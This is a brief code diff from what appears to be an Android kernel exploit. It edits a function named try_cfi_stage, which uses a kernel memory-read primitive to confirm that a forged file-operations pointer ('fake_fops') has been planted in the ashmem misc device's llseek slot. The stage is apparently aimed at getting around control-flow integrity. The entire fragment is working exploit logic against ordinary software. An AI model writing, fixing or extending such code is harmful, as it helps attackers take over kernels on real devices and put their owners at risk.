@@ -256,9 +256,10 @@ int try_cfi_stage(void) {
   }
 
   uintptr_t misc_fops = data_addr(ASHMEM_MISC_FOPS);
+  uintptr_t misc_fops_llseek = misc_fops + FOPS_LLSEEK_OFF;
   uint64_t pre_fops = 0;
   ssize_t pre_rb = configfs_read_once(
-      fd, misc_fops, &pre_fops, sizeof(pre_fops));
+      fd, misc_fops_llseek, &pre_fops, sizeof(pre_fops));
   if (pre_rb != (ssize_t)sizeof(pre_fops) || pre_fops != fake_fops) {
     pr_warning("cfi misc_fops mismatch ret=%zd target=%016zx "
                "read=%016llx want=%016zx errno=%d\n",
